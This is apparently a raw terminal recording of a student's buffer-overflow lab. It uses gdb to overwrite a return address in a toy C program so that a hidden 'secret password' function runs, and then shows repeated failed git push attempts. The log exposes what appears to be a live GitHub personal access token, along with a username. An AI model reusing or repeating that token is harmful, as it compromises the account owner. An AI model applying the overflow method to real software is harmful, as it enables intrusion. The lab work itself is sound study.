Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) run
Starting program: /home/user01/midex2 
a show    info register
Not good
[Inferior 1 (process 4325) exited with code 0377]
(gdb) info register
The program has no registers now.
(gdb) info register[C[C[C[C[C[C[Klist
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) break 1[K16
Breakpoint 1 at 0x804921e: file midex2.c, line 16.
(gdb) run
Starting program: /home/user01/midex2 
1 aaa
Not good

Breakpoint 1, main1 () at midex2.c:16
16	}
(gdb) info register
eax            0xffffffff	-1
ecx            0x804d570	134534512
edx            0xb7fae890	-1208293232
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x804921e	0x804921e <main1+46>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/x40[K[K40 $[K[K[K[K[K40x #eps[K[K[K[K$esp
0xbffff6c0:	0x61610000	0x00c30061	0x00000000	0xb7fff000
0xbffff6d0:	0x00000000	0x00000000	0x00000000	0x4ab97600
0xbffff6e0:	0x0000000b	0xbffff8e0	0xb7e07d09	0xb7fb0808
0xbffff6f0:	0xb7fad000	0xb7fad000	0x00000000	0xb7e07e6b
0xbffff700:	0xb7fad3fc	0x00000000	0x00000000	0x0804928b
0xbffff710:	0x00000001	0xbffff7d4	0xbffff7dc	0x08049261
0xbffff720:	0xb7fe6f60	0x00000000	0xbffff738	0x08049239
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) x/40x $esp[C[C[C[C[C[C[Knext
main () at midex2.c:19
19	}
(gdb) x/x [K[K[K[Knextx/40x $esp
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
0xbffff760:	0xb7fff000	0x00000000	0xb7fad000	0x00000000
0xbffff770:	0x00000000	0x882dba06	0xc9d1fc16	0x00000000
0xbffff780:	0x00000000	0x00000000	0x00000001	0x08049080
0xbffff790:	0x00000000	0xb7fec350	0xb7fe6f60	0x0804c000
0xbffff7a0:	0x00000001	0x08049080	0x00000000	0x080490b2
0xbffff7b0:	0x08049224	0x00000001	0xbffff7d4	0x08049240
0xbffff7c0:	0x080492a0	0xb7fe6f60	0xbffff7cc	0xb7fff940
(gdb) x/40x $esp[C[C[C[C[C[C[6Pnextx/40x $esp[C[C[C[C[C[Cinfo register
eax            0xffffffff	-1
ecx            0x804d570	134534512
edx            0xb7fae890	-1208293232
ebx            0x0	0
esp            0xbffff730	0xbffff730
ebp            0xbffff738	0xbffff738
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049239	0x8049239 <main+21>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) next
__libc_start_main (main=0x8049224 <main>, argc=1, argv=0xbffff7d4, 
    init=0x8049240 <__libc_csu_init>, fini=0x80492a0 <__libc_csu_fini>, 
    rtld_fini=0xb7fe6f60 <_dl_fini>, stack_end=0xbffff7cc)
    at ../csu/libc-start.c:344
344	../csu/libc-start.c: No such file or directory.
(gdb) nextinfo register
eax            0xffffffff	-1
ecx            0x804d570	134534512
edx            0xb7fae890	-1208293232
ebx            0x0	0
esp            0xbffff750	0xbffff750
ebp            0x0	0x0
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0xb7df09a4	0xb7df09a4 <__libc_start_main+244>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) info register[C[C[C[C[C[Cnext[Kinfo register[C[C[C[C[C[Cnext[Kinfo register[K[K[K[K[K[K[K[K[K[K[K[K[Kx/40 x[K[Kx $ebp
0x0:	Cannot access memory at address 0x0
(gdb) next
[Inferior 1 (process 4329) exited with code 0377]
(gdb) next
The program is not being run.
(gdb) next
The program is not being run.
(gdb) run[K[K[Klist
339	in ../csu/libc-start.c
(gdb) quit
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gdb midex2 [K
GNU gdb (Debian 8.1-4+b1) 8.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from midex2...done.
(gdb) list
4		printf("Not good\n");
5		return -1;
6	}
7	
8	int func2(){
9		printf("The Secret Password is secret!!!\n");
10		return 1;
11	}
12	void main1(){
13		char buffer[MY_SHA3_HASH_LAST_TWO_DIGIT_NUMBER];
(gdb) 
14		scanf("%s", buffer);
15		func1();
16	}
17	void main(){
18		main1();
19	}
(gdb) break 15
Breakpoint 1 at 0x8049219: file midex2.c, line 15.
(gdb) run < A2
Starting program: /home/user01/midex2 < A2

Breakpoint 1, main1 () at midex2.c:15
15		func1();
(gdb) infoe[K register
eax            0x1	1
ecx            0x1	1
edx            0xb7fae89c	-1208293220
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x8049219	0x8049219 <main1+41>
eflags         0x286	[ PF SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) info register[C[C[C[C[C[C[5Prun < A2[C[C[C[C[C[Cbreak 15[C[C[C[C[C[C[4Plist[K[K[K[Kx/40 [Kx $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) print func2
$1 = {int ()} 0x80491c1 <func2>
(gdb) next
Not good
16	}
(gdb) info reig[K[Kgister
eax            0xffffffff	-1
ecx            0x804e170	134537584
edx            0xb7fae890	-1208293232
ebx            0x804c000	134529024
esp            0xbffff6c0	0xbffff6c0
ebp            0xbffff728	0xbffff728
esi            0xb7fad000	-1208299520
edi            0x0	0
eip            0x804921e	0x804921e <main1+46>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) info register[C[C[C[C[C[Cnext[Kprint func2[C[C[C[C[C[C[1Px/40x $esp
0xbffff6c0:	0x41410000	0x41414141	0x41414141	0x41414141
0xbffff6d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff700:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x080491c1	0x08049200
0xbffff730:	0xb7fad000	0xb7fad000	0x00000000	0xb7df09a1
0xbffff740:	0x00000001	0xbffff7d4	0xbffff7dc	0xbffff764
0xbffff750:	0x00000001	0x00000000	0xb7fad000	0xb7fe6d0a
(gdb) q![K[Kquit
A debugging session is active.

	Inferior 1 [process 4347] will be killed.

Quit anyway? (y or n) y
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
A2        genA2.py    [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
genA1.py  input1.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ clear
[3J[H[2J]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi A2
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"A2" 1L, 107C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAQ[34m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[2;1HAAAAAAAAAAAAAAAAAAAAAAAQ[38;5;81m^D^H[m
[94m~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll"A2" 1L, 107C[1;1H[?25h[?25l[24;52HI[1;1H[24;52H [1;1H[24;1H[1m-- INSERT --[m[24;13H[K[24;62H1,1[11CAll[1;1H[?25h[?25l[78CAA[2;1HA[22CAQ[38;5;81m^D^H[m[24;64H2[1;2H[?25h[?25l[77CAA[2;1HA[23CAQ[38;5;81m^D^H[m[24;64H3[1;3H[?25h[?25l[76CAA[2;1HA[24CAQ[38;5;81m^D^H[m[24;64H4[1;4H[?25h[?25l[75CAA[2;1HA[25CAQ[38;5;81m^D^H[m[24;64H5[1;5H[?25h[24;1H[K[1;4H[?25l[24;52H^[[1;4H[24;52H  [1;5H[24;62H1,4[11CAll[1;4H[?25h[?25l[24;52H:[1;4H[24;52H[K[24;1H:[?2004h[?25hQ[?25l[?25h![?25l[?25h[?25l[97m[41mE492: Not an editor command: Q![1;4H[m[24;62H1,4[11CAll[1;4H[?25h[?25l[24;52H^[[1;4H[24;52H  [1;4H[24;52H^[[1;4H[24;52H  [1;4H[?25h[?25l[24;52H:[1;4H[24;1H[K[24;1H:[?2004h[?25hW[?25l[?25hQ[?25l[?25h[?25l[97m[41mE492: Not an editor command: WQ[1;4H[m[24;62H1,4[11CAll[1;4H[?25h[?25l[24;52H^[[1;4H[24;52H  [1;4H[24;52H^[[1;4H[24;52H  [1;4H[?25h[?25l[24;52H:[1;4H[24;1H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25h[?25l[?1006l[?1002l[?2004l"A2" 1L, 111C written[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t
[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ./ [Kmidex2 < A2
Not good
The Secret Password is secret!!!
Segmentation fault
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ CP A[K[K[K[KCp a[K[K[K[Kcp A2 INPUT[K[K[K[K[Kinput2.txt
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ cp A2 input2.txt[3P./midex2 < A2[K[Kinput2.txt
Not good
The Secret Password is secret!!!
Segmentation fault
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ rm r[K-r A2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ LS
bash: LS: command not found
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
genA1.py  input1.txt  [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
genA2.py  input2.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gid[K[K[Kgit add input2.txt midex2 typescript2 midex2.c
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git commit =-=[K[K[K-m" [K[K " secon[K[K[K[K[K[Ksecond finig[Ksh [K"
[master2 b320caf] second finish
 4 files changed, 1226 insertions(+)
 create mode 100644 input2.txt
 create mode 100755 midex2
 create mode 100644 midex2.c
 create mode 100644 typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gitr cc[K[K[K[K[K[K[Kgit cehckout [K[K[K[K[K[K[K[Khekc[K[K[K[K[Kbranch
[?1h=  main[m[m
  master[m[m
* [32mmaster2[m[m
[K[?1l>]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ gt push[K[K[K[K[K[K[Kgit pus [Kh
fatal: The current branch master2 has no upstream branch.
To push the current branch and set the remote as upstream, use

    git push --set-upstream origin master2

]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origim master2
fatal: 'origim' does not appear to be a git repository
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master2
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.
remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi te[K[K[K[K[Kghp_vZohHe228r[KRam[K[KAMS9m[K[K[KS[KS[KS[Ks9mHN5jFft6mpAYSHU48cnWD
bash: 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: command not found
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 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[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[17Pit push origin master2
Username for 'https://github.com': HARKSU      harksu
Password for 'https://harksu@github.com': 
remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.
remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 

remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.
remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remote -v
origin	https://github.com/harksu/CloudSecurity-.git (fetch)
origin	https://github.com/harksu/CloudSecurity-.git (push)
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git intit[K[K[Kit
Reinitialized existing Git repository in /home/user01/.git/
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git stuat[K[K[Kauts
git: 'stauts' is not a git command. See 'git --help'.

The most similar command is
	status
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git status
On branch master2
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git checkout -- <file>..." to discard changes in working directory)

	[31mmodified:   .git-credentials[m
	[31mmodified:   .viminfo[m
	[31mmodified:   typescript1[m
	[31mmodified:   typescript2[m

Untracked files:
  (use "git add <file>..." to include in what will be committed)

	[31mgenA2.py[m

no changes added to commit (use "git add" and/or "git commit -a")
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git add .
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git status
On branch master2
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

	[32mmodified:   .git-credentials[m
	[32mmodified:   .viminfo[m
	[32mnew file:   genA2.py[m
	[32mmodified:   typescript1[m
	[32mmodified:   typescript2[m

]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git commit -m "jebal"
[master2 cba7e15] jebal
 5 files changed, 1725 insertions(+), 323 deletions(-)
 rewrite .viminfo (84%)
 create mode 100644 genA2.py
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ g[Kgit push origin master
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.
remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master2
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 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[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kgit push origin master2[K
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ ls
genA1.py  input1.txt  [0m[37;41mmidex1[0m    [01;32mmidex2[0m    pw.txt     typescript1
genA2.py  input2.txt  midex1.c  midex2.c  README.md  typescript2
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi pw.txt 
[?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"pw.txt" 1L, 41C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[1;1H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
[94m~                                                                              [3;1H~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[1;1H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
[94m~                                                                              [3;1H~                                                                              [4;1H~                                                                              [5;1H~                                                                              [6;1H~                                                                              [7;1H~                                                                              [8;1H~                                                                              [9;1H~                                                                              [10;1H~                                                                              [11;1H~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,1[11CAll"pw.txt" 1L, 41C[1;1H[?25h[?25l[24;52H^[[1;1H[24;52H  [1;1H[24;52H^[[1;1H[24;52H  [1;1H[?25h[?25l[24;52H:[1;1H[24;1H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25h[?25l[?1006l[?1002l[?2004l"pw.txt" 1L, 41C written[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t
[?2004l[?1l>[?25h[?1049l[23;0;0t]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ vi pw.txt ls[Kgit push origin master2
Username for 'https://github.com': harksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ 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[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Kgit push origin master2[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[13Pvi pw.txt git push origin master2
Username for 'https://github.com': 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
Password for 'https://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@github.com': 
remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.
remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master2
Username for 'https://github.com': hakr  rksu
Password for 'https://harksu@github.com': 
remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.
remote: Please see https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/ for more information.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git push origin master2
Username for 'https://github.com': hgarksu      arksu
Password for 'https://harksu@github.com': 
remote: Invalid username or password.
fatal: Authentication failed for 'https://github.com/harksu/CloudSecurity-.git/'
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ girt [K[K[K[K[Kgit remote remove origin
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remove[K[Kte -v
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remote add origin https://harskulim@naver.com [K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Korigin [K github[K[K[K[K[K[Kgithub.com/harksu/CLoud[K[K[K[KloudSecurity-.git
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remo[K[K[Kemoet[K[Kte -v
origin	github.com/harksu/CloudSecurity-.git (fetch)
origin	github.com/harksu/CloudSecurity-.git (push)
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git add .
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git commit 
hint: Waiting for your editor to close the file... [?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"~/.git/COMMIT_EDITMSG" 10L, 262C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[2;1H[34m# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# On branch [m[35mmaster2[m
[34m# [m[35mChanges to be committed:[m
[34m#       [m[32mmodified[m[34m: [m[31m  .viminfo[m
[34m#       [m[32mmodified[m[34m: [m[31m  typescript1[m
[34m#       [m[32mmodified[m[34m: [m[31m  typescript2[m
[34m#[m
[94m~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,0-1[9CAll[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[2;1H[96m# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# On branch [m[38;5;224mmaster2[m
[96m# [m[38;5;81mChanges to be committed:[m
[96m#       [m[38;5;121mmodified[m[96m: [m[95m  .viminfo[m
[96m#       [m[38;5;121mmodified[m[96m: [m[95m  typescript1[m
[96m#       [m[38;5;121mmodified[m[96m: [m[95m  typescript2[m
[96m#[m
[94m~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,0-1[9CAll"~/.git/COMMIT_EDITMSG" 10L, 262C[1;1H[?25h[?25l[24;52H^M[1;1H[24;52H  [2;1H[24;62H2,1  [2;1H[?25h[?25l[24;52H^M[2;1H[24;52H  [3;1H[24;62H3[3;1H[?25h[?25l[24;52H^M[3;1H[24;52H  [4;1H[24;62H4[4;1H[?25h[?25l[24;52H^[[4;1H[24;52H  [4;1H[24;52H^[[4;1H[24;52H  [4;1H[?25h[?25l[24;52H:[4;1H[24;1H[K[24;1H:[?2004h[?25hw[?25l[?25hq[?25l[?25h[?25l[?1006l[?1002l[?2004l".git/COMMIT_EDITMSG" 10L, 262C written[23;2t[23;1t[22;2t[22;1t[23;2t[23;1t
[?2004l[?1l>[?25h[?1049l[23;0;0t[KAborting commit due to empty commit message.
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git [K[K[K[Kgit psu[K[K[Kpush originm[K[K[K[K[K[Krigin master [K2
fatal: 'github.com/harksu/CloudSecurity-.git' does not appear to be a git repository
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remove remote origin
git: 'remove' is not a git command. See 'git --help'.

The most similar command is
	remote
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remove remote origin[1P origin[1P origin[1P origin[1P origin[1P origin[1P origin[1Porigin[1P origin[1P origin[1P origin[1P origin[1P origin[1P origin[1Porigin[C originr origine originm origino origint origine origin[C originr origine originm origino originv origine origin[C origin
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git remote [K[K[K[K[K[K[Kremote [K[K[K[K[K[K[Kadd remote d[K[K[K[K[K[Kmote origin github[K[K[K[Kthub.com/harksu/CloudSecurity-
fatal: pathspec 'remote' did not match any files
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git add remote origin github.com/harksu/CloudSecurity-i[K[K
fatal: pathspec 'remote' did not match any files
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git[K[K[Kgit add remote origin github.com/harksu/CloudSecurity[1P[1P[1P[C[1P[C[C[C[C[C[1@ [1@a[1P[1P[C[C[1@ [1@a[1@d[1@d[C[1@ 
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git add .
]0;user01@kali: ~[01;31muser01@kali[00m:[01;34m~[00m$ git cmom[K[K[K[Kcommit
hint: Waiting for your editor to close the file... [?1000h[?2004h[?1049h[22;0;0t[?1h=[?2004h[1;24r[?12h[?12l[22;2t[22;1t[27m[23m[29m[m[H[2J[?25l[24;1H"~/.git/COMMIT_EDITMSG" 10L, 262C[2;1Hâ–½[6n[2;1H  [1;1H[>c]10;?]11;?[2;1H[34m# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# On branch [m[35mmaster2[m
[34m# [m[35mChanges to be committed:[m
[34m#       [m[32mmodified[m[34m: [m[31m  .viminfo[m
[34m#       [m[32mmodified[m[34m: [m[31m  typescript1[m
[34m#       [m[32mmodified[m[34m: [m[31m  typescript2[m
[34m#[m
[94m~                                                                              [12;1H~                                                                              [13;1H~                                                                              [14;1H~                                                                              [15;1H~                                                                              [16;1H~                                                                              [17;1H~                                                                              [18;1H~                                                                              [19;1H~                                                                              [20;1H~                                                                              [21;1H~                                                                              [22;1H~                                                                              [23;1H~                                                                              [m[24;62H1,0-1[9CAll[1;1H[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?1000l[?1006h[?1002h[?1006l[?1002l[?1006h[?1002h[27m[23m[29m[m[H[2J[?25l[2;1H[96m# Please enter the commit message for your changes. Lines starting
# with '#' will be ignored, and an empty message aborts the commit.
#
# On branch [m[38;5;224mmaster2[m
